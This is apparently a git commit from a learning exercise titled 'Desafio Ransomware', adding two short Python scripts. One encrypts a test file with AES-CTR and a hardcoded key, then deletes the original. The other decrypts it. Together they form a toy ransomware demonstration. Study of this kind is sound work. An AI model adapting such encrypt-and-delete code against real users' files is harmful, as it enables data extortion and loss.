5dfc77c2d4fc5897fe6eb833dc81cccc82eaf136
Katan Yoseph <110505130+Katan-Yoseph@users.noreply.github.com>
2024-01-01 12:45:38 -0300

    Add files via upload

---
+++ Desafio Ransomware/decrypter.py
@@ -0,0 +1,16 @@
+import os
+import pyaes
+
+
+file_name = "teste.txt.criptografado"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+key = b"criptografado123"
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+os.remove(file_name)
+new_file = "teste.txt"
+new_file = open(f'{new_file}', "wb")
+new_file.write(decrypt_data)
+new_file.close()
---
+++ Desafio Ransomware/encrypter.py
@@ -0,0 +1,15 @@
+import os
+import pyaes
+
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+os.remove(file_name)
+key = b"criptografado123"
+aes = pyaes.AESModeOfOperationCTR(key)
+crypto_data = aes.encrypt(file_data)
+new_file = file_name + ".criptografado"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
